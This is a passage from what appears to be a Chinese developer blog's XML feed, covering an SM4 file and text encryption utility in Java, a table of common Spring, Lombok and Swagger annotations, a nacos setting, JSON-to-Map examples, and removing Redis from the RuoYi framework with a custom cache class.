string">"96818460"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"解密失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Security<span class="token punctuation">.</span><span class="token function">getProvider</span><span class="token punctuation">(</span>BouncyCastleProvider<span class="token punctuation">.</span>PROVIDER_NAME<span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//No such provider: BC</span>            Security<span class="token punctuation">.</span><span class="token function">addProvider</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BouncyCastleProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 生成 Cipher     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Cipher <span class="token function">generateCipher</span><span class="token punctuation">(</span><span class="token keyword">int</span> mode<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyData<span class="token punctuation">)</span> <span class="token keyword">throws</span> InvalidKeyException<span class="token punctuation">,</span> NoSuchPaddingException<span class="token punctuation">,</span> NoSuchAlgorithmException<span class="token punctuation">,</span> NoSuchProviderException <span class="token punctuation">{</span>        Cipher cipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"SM4/ECB/PKCS5Padding"</span><span class="token punctuation">,</span> BouncyCastleProvider<span class="token punctuation">.</span>PROVIDER_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>        Key sm4Key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>keyData<span class="token punctuation">,</span> <span class="token string">"SM4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> sm4Key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> cipher<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 生成密钥     *     * @Author: CZM     * @Param: [publicKey]     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generateKey</span><span class="token punctuation">(</span>String publicKey<span class="token punctuation">)</span> <span class="token keyword">throws</span> NoSuchAlgorithmException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 将公钥转换为字节数组</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> publicKeyBytes <span class="token operator">=</span> publicKey<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 使用SHA-256哈希函数对公钥进行哈希</span>        MessageDigest digest <span class="token operator">=</span> MessageDigest<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hash <span class="token operator">=</span> digest<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span>publicKeyBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 取前128位作为SM4算法的密钥</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> keyData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> keyData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 加密文件     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">encryptFile</span><span class="token punctuation">(</span>String sourcePath<span class="token punctuation">,</span> String targetPath<span class="token punctuation">,</span> String key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//加密文件</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyData <span class="token operator">=</span> <span class="token function">generateKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            Cipher cipher <span class="token operator">=</span> <span class="token function">generateCipher</span><span class="token punctuation">(</span>Cipher<span class="token punctuation">.</span>ENCRYPT_MODE<span class="token punctuation">,</span> keyData<span class="token punctuation">)</span><span class="token punctuation">;</span>            CipherInputStream cipherInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CipherInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>sourcePath<span class="token punctuation">)</span><span class="token punctuation">,</span> cipher<span class="token punctuation">)</span><span class="token punctuation">;</span>            FileUtil<span class="token punctuation">.</span><span class="token function">writeFromStream</span><span class="token punctuation">(</span>cipherInputStream<span class="token punctuation">,</span> targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            IoUtil<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span>cipherInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"加密文件出现异常：{}"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 解密文件     *     * @param sourcePath 待解密的文件路径     * @param targetPath 解密后的文件路径     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">decryptFile</span><span class="token punctuation">(</span>String sourcePath<span class="token punctuation">,</span> String targetPath<span class="token punctuation">,</span> String key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"解密文件：{} 到：{}"</span><span class="token punctuation">,</span> sourcePath<span class="token punctuation">,</span> targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        InputStream in <span class="token operator">=</span> null<span class="token punctuation">;</span>        OutputStream out <span class="token operator">=</span> null<span class="token punctuation">;</span>        String result <span class="token operator">=</span> <span class="token string">"success"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>sourcePath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> IoUtil<span class="token punctuation">.</span><span class="token function">readBytes</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> keyData <span class="token operator">=</span> <span class="token function">generateKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            Cipher cipher <span class="token operator">=</span> <span class="token function">generateCipher</span><span class="token punctuation">(</span>Cipher<span class="token punctuation">.</span>DECRYPT_MODE<span class="token punctuation">,</span> keyData<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptedBytes <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>decryptedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            result <span class="token operator">=</span> <span class="token string">"fail"</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"解密出现异常：{}"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            IoUtil<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>            IoUtil<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">/**     * sm4文本加密     *     * @param secretKey 秘钥     * @param params    要加密的内容     * @return 加密后的值     */</span>    <span class="token annotation punctuation">@SneakyThrows</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sm4EncryptUtil</span><span class="token punctuation">(</span>String secretKey<span class="token punctuation">,</span> String params<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">generateKey</span><span class="token punctuation">(</span>secretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        SymmetricCrypto sm4 <span class="token operator">=</span> SmUtil<span class="token punctuation">.</span><span class="token function">sm4</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sm4<span class="token punctuation">.</span><span class="token function">encryptHex</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * sm4文本解密     *     * @param secretKey      秘钥     * @param encryptContext 要解密的内容     * @return 解密后的值     */</span>    <span class="token annotation punctuation">@SneakyThrows</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sm4DecryptUtil</span><span class="token punctuation">(</span>String secretKey<span class="token punctuation">,</span> String encryptContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">generateKey</span><span class="token punctuation">(</span>secretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>        SymmetricCrypto sm4 <span class="token operator">=</span> SmUtil<span class="token punctuation">.</span><span class="token function">sm4</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sm4<span class="token punctuation">.</span><span class="token function">decryptStr</span><span class="token punctuation">(</span>encryptContext<span class="token punctuation">,</span> CharsetUtil<span class="token punctuation">.</span>CHARSET_UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> SM4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用注解</title>
      <link href="/2022/04/24/java-chang-jian-zhu-jie/"/>
      <url>/2022/04/24/java-chang-jian-zhu-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><table><thead><tr><th>名称</th><th>用法</th></tr></thead><tbody><tr><td>@ApiParam</td><td>controller类中方法的字段注解，在swagger文档显示。@ApiParam(value = “备注”, example = “这是一个备注信息”)</td></tr><tr><td>@Data</td><td>用于实体类上方，自动生成get、set、toString等方法。需要有lombok插件和依赖。</td></tr><tr><td>@NoArgsConstructor</td><td>用于实体类上方，自动生成无参构造函数。需要有lombok插件和依赖。</td></tr><tr><td>@AllArgsConstructor</td><td>用于实体类上方，自动生成全参构造函数。需要有lombok插件和依赖。</td></tr><tr><td>@Table</td><td>用于实体类上方，让实体类映射数据库中的表。用法：<code>@Table(name=&quot;tab_user&quot;,uniqueConstraints&#123;@UniqueConstraint(columnNames=&#123;&quot;uid&quot;,&quot;email&quot;&#125;)&#125;)</code>用于实体类上方，关联“tab_user”表，”uid”,”email”对应数据库表中的字段是唯一的，等同于多个<code>@Column(unique=true)</code>。</td></tr><tr><td>@Id和@GeneratedValue</td><td>用于标注主键属性。如：<code>@Id@Column(name = &quot;parts_info_id&quot;)@GeneratedValue(strategy = GenerationType.IDENTITY, generator = &quot;JDBC&quot;)</code></td></tr><tr><td>@Column</td><td>用于属性上方，将实体属性与数据库字段映射，用法：<code>@Column(name = &quot;parts_info_num&quot;)</code> ,当属性名为partsInfoNum时可省略。</td></tr><tr><td>@Api</td><td>用于Controller类上方，Swagger的注解。表示标识这个类是swagger的资源。如：<code>@Api(tags = &quot;记录类&quot;)</code></td></tr><tr><td>@ApiOperation</td><td>用于Controller类的方法上方，Swagger的注解。表示一个http请求的操作。如：<code>@ApiOperation(value = &quot;方法描述&quot;, notes = &quot;提示内容&quot;)</code></td></tr><tr><td>@ApiMode</td><td>用在返回对象类上，Swagger的注解。表示对类进行说明。如：<code>@ApiModel(&quot;备件领取请求类&quot;)</code>。value–表示对象名description–描述</td></tr><tr><td>@ApiModelProperty</td><td>用于返回对象属性上，Swagger的注解。如：<code>@ApiModelProperty(value=&quot;备件信息主键&quot;)</code>。value–字段说明，name–重写属性名字，dataType–重写属性类型，required–是否必填，example–举例说明，hidden–隐藏</td></tr><tr><td>@NotNull</td><td>用于实体类或model类属性上方，用于数据校验。需要有注解@valid开启校验。不能为null，但可以为empty。null: 表示对象为空的校验。empty: 表示对象为空或长度为0的String。blank: 表示对象为空或长度为0的String、空格字符串。</td></tr><tr><td>@NotEmpty</td><td>同上为校验注解。不能为null，而且长度必须大于0。</td></tr><tr><td>@NotBlank</td><td>同上为校验注解。<strong>只能作用在String上</strong>，不能为null，而且调用trim()后，长度必须大于0。</td></tr><tr><td>@Size</td><td>@Size(min = 0, max = 30, message = “登录账号长度不能超过30个字符”)，校验字符串长度</td></tr><tr><td>@Slf4j</td><td>用于类上方，用于日志输出。需要有lombok插件和依赖。</td></tr><tr><td>@Service</td><td>用于service类上方，标注业务层组件，默认名称为类名。</td></tr><tr><td>@Transactiona</td><td>是声明式事务管理，在接口实现类或接口实现方法上添加，只有public的方法才起作用，只读的接口不需要使用事务接口。@Transactional(rollbackFor = Exception.class)</td></tr><tr><td>@Resource和@Autowired</td><td>都是用来实现依赖注入的。只是@AutoWried按by type自动注入，而@Resource默认按byName自动注入。</td></tr><tr><td>@RequestParam</td><td>用于Controller类的请求参数前，将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解）用法：<code>@RequestParam(value=参数名”,required=”true（请求路径必须包含该参数）/false”,defaultValue=“默认值，如果设置了该值，required=true将失效，自动为false,如果没有传该参数，就使用默认值”)</code>                                                                                                  如：public ApiResponse method11(@RequestParam(“id”) int id, @RequestBody List<Dog> dogs)</Dog></td></tr><tr><td>@RequestPart</td><td>用于Controller类的请求参数前，这个注解用在multipart/form-data表单提交请求的方法上，主要用来搭配springboot接收MultipartFile类型的文件 如：<code>@RequestPart(&quot;file&quot;) MultipartFile file</code>。</td></tr><tr><td>@RequestBody</td><td>用于Controller类的请求参数前，通过@requestBody可以将请求体中的JSON字符串绑定到相应的bean上，当然，也可以将其分别绑定到对应的字符串上。如<code>(@requestBody String userName,@requestBody String pwd) 或 （@requestBody User user）</code></td></tr><tr><td>@PathVariable</td><td>映射 URL 绑定的占位符 @RequestMapping(“/getUserById/{name}”)    public User getUser(@PathVariable(“name”) String name){        return userService.selectUser(name);    }</td></tr><tr><td>@RestController</td><td>用于Controller类上方，使返回的数据是Json格式</td></tr><tr><td>@Slf4j</td><td>放在需要日志输出的类上方，相当<code>logprivate final Logger logger = LoggerFactory.getLogger(当前类名.class);</code> ,就可以用log.info(“”)了</td></tr><tr><td>@IgnoreUserToken</td><td>注解关闭token验证</td></tr><tr><td>@PostConstruct</td><td>是Java自带的注解，在方法上加该注解会在项目启动的时候执行该方法，也可以理解为在spring容器初始化的时候执行该方法。</td></tr><tr><td>@Transient</td><td>@Transient注解位于javax.persistence包下，因此需要导入该包。 如果实体类中存在某些属性，但是数据库中没有对应的字段，可以使用@Transient注解来标注这些属性，表示这些属性不需要映射到数据库中。</td></tr><tr><td>@PropertySource</td><td>加载指定的配置文件。如：在resources目录下新建一个person.properties文件，配置name=kuangshen。然后代码中读取配置@PropertySource(value = “classpath:person.properties”) @Component //注册bean public class Person {@Value(“${name}”)    private String name;}</td></tr><tr><td>@configurationProperties</td><td>默认从全局配置文件中获取值</td></tr><tr><td>@JsonIgnore</td><td>使字段在返回的JSON中不显示，加在对应的字段上方，import com.fasterxml.jackson.annotation.JsonIgnore;</td></tr><tr><td>@ApiIgnore</td><td>使接口在swagger文档中不显示，加在方法或类上方</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 注解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nacos本地服务不注册</title>
      <link href="/2022/04/24/nacos-zhu-ce/"/>
      <url>/2022/04/24/nacos-zhu-ce/</url>
      
        <content type="html"><![CDATA[<h1 id="nacos本地服务不注册"><a href="#nacos本地服务不注册" class="headerlink" title="nacos本地服务不注册"></a>nacos本地服务不注册</h1><p><img src="/images/nacos%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E4%B8%8D%E6%B3%A8%E5%86%8C.png" alt="image-20240216223636117"></p><pre class=" language-C"><code class="language-C">--spring.cloud.nacos.discovery.register-enabled=false</code></pre><p>参考链接：<a href="http://blog.miequan.com/archives/3232">http://blog.miequan.com/archives/3232</a></p>]]></content>
      
      
      <categories>
          
          <category> nacos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nacos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON转换成Map</title>
      <link href="/2022/04/06/json-zhuan-map/"/>
      <url>/2022/04/06/json-zhuan-map/</url>
      
        <content type="html"><![CDATA[<h1 id="JSON转换成Map"><a href="#JSON转换成Map" class="headerlink" title="JSON转换成Map"></a>JSON转换成Map</h1><p>com.alibaba.fastjson</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonToMapExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String jsonStr <span class="token operator">=</span> <span class="token string">"{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将JSON字符串转换为Map&lt;String, Object></span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> map <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 遍历Map并输出键值对</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> entry <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String key <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object value <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Jackson库</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonToMapExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String json <span class="token operator">=</span> <span class="token string">"your json string here"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            ObjectMapper objectMapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> map <span class="token operator">=</span> objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TypeReference</span><span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用转换后的map进行操作</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 转换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>若依系统分离版去除redis数据库</title>
      <link href="/2022/04/02/ruo-yi-xi-tong-fen-chi-ban-qu-chu-redis-shu-ju-ku/"/>
      <url>/2022/04/02/ruo-yi-xi-tong-fen-chi-ban-qu-chu-redis-shu-ju-ku/</url>
      
        <content type="html"><![CDATA[<p>﻿﻿# 若依系统分离版去除redis数据库</p><p>﻿参考:<a href="https://blog.csdn.net/weixin_43684214/article/details/127773165?spm=1001.2014.3001.5506">https://blog.csdn.net/weixin_43684214/article/details/127773165?spm=1001.2014.3001.5506</a></p><p>加入过期时间</p><h2 id="1-注释yml中的redis-配置"><a href="#1-注释yml中的redis-配置" class="headerlink" title="1 注释yml中的redis 配置"></a>1 注释yml中的redis 配置</h2><p><img src="/images/%E6%B3%A8%E9%87%8Aredis%E9%85%8D%E7%BD%AE.png"></p><h2 id="2-去除ruoyi-framework下RedisConfig的配置"><a href="#2-去除ruoyi-framework下RedisConfig的配置" class="headerlink" title="2 去除ruoyi-framework下RedisConfig的配置)"></a>2 去除ruoyi-framework下RedisConfig的配置)</h2><p><img src="/images/%E4%BF%AE%E6%94%B9RedisConfig.png"></p><h2 id="3-在ruoyi-common的core-redis下新建MyCache类"><a href="#3-在ruoyi-common的core-redis下新建MyCache类" class="headerlink" title="3 在ruoyi-common的core/redis下新建MyCache类"></a>3 在ruoyi-common的core/redis下新建MyCache类</h2><pre class=" language-c"><code class="language-c">import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>Cache<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>support<span class="token punctuation">.</span>SimpleValueWrapper<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Component<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Collection<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Objects<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 自定义缓存实现类 * @Author: CZM */</span>@Componentpublic class MyCache implements Cache <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 存储缓存数据的Map     */</span>    private Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> storage <span class="token operator">=</span> new ConcurrentHashMap<span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 缓存过期时间的Map     */</span>    private Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Long<span class="token operator">></span> expiration <span class="token operator">=</span> new ConcurrentHashMap<span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @Override    public String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @Override    public Object <span class="token function">getNativeCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 判断是否存在指定的键     *     * @param key 键     * @return true 存在 false 不存在     */</span>    public boolean <span class="token function">hasKey</span><span class="token punctuation">(</span>String key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> storage<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 根据键获取缓存值     *     * @param key 键     * @return 缓存值     */</span>    @Override    public ValueWrapper <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String k <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isExpired</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">evict</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Object value <span class="token operator">=</span> storage<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> Objects<span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">?</span> null <span class="token punctuation">:</span> new 